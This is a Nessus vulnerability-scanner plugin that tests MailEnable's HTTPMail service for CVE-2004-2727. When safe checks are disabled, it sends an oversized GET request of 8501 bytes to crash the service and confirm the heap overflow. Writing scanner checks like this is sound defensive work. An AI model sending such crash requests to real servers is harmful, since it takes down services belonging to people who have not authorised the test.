#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#


include("compat.inc");

if (description) {
  script_id(14656);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2004-2727");
  script_bugtraq_id(10312);
  script_xref(name:"OSVDB", value:"6037");

  script_name(english:"MailEnable Professional HTTPMail GET Request Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by a remote denial-of-service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The target is running at least one instance of MailEnable that has a
flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and
Enterprise Editions.  The flaw can be exploited by issuing an HTTP 
request exceeding 4045 bytes (8500 if logging is disabled), which 
causes a heap buffer overflow, crashing the HTTPMail service and 
possibly allowing for arbitrary code execution." );
 script_set_attribute(attribute:"see_also", value:"http://www.hat-squad.com/en/000071.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MailEnable Professional / Enterprise 1.19 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
  script_summary(english:"Checks for GET Overflow Vulnerability in MailEnable HTTPMail Service");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004-2009 George A. Theall");
  script_family(english:"CGI abuses");
  script_dependencie("global_settings.nasl", "http_version.nasl");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");

host = get_host_name();
# nb: HTTPMail defaults to 8080 but can run on any port. 
port = 8080;
if (get_port_state(port)) soc = http_open_socket(port);
if (!soc) {
    port = get_http_port(default:80);
    if (get_port_state(port)) soc = http_open_socket(port);
}
if (!soc) {
  exit(1, "cannot determine port for MailEnable's HTTPMail service");
}
http_close_socket(soc);
if (debug_level) display("debug: searching for GET Overflow vulnerability in MailEnable HTTPMail Service on ", host, ":", port, ".\n");

# Make sure banner's from MailEnable.
banner = get_http_banner(port:port);
if (debug_level) display("debug: banner =>>", banner, "<<.\n");
if (!egrep(pattern:"^Server: .*MailEnable", string:banner)) exit(0);

# Try to bring it down.
if (safe_checks() == 0) {
  soc = http_open_socket(port);
  if (soc) {
    req = string(
      # assume logging is disabled.
      "GET /", crap(length:8501, data:"X"), " HTTP/1.0\r\n",
      "\r\n"
    );
    if (debug_level) display("debug: sending =>>", req, "<<\n");
    send(socket:soc, data:req);
    res = http_recv(socket:soc);
    http_close_socket(soc);
    if (res) {
      if (debug_level) display("debug: res =>>", res, "<<\n");
    }
    else {
     soc = http_open_socket(port);
     if (!soc)
       security_warning(port);
     else
       http_close_socket(soc);

    }
  }
}
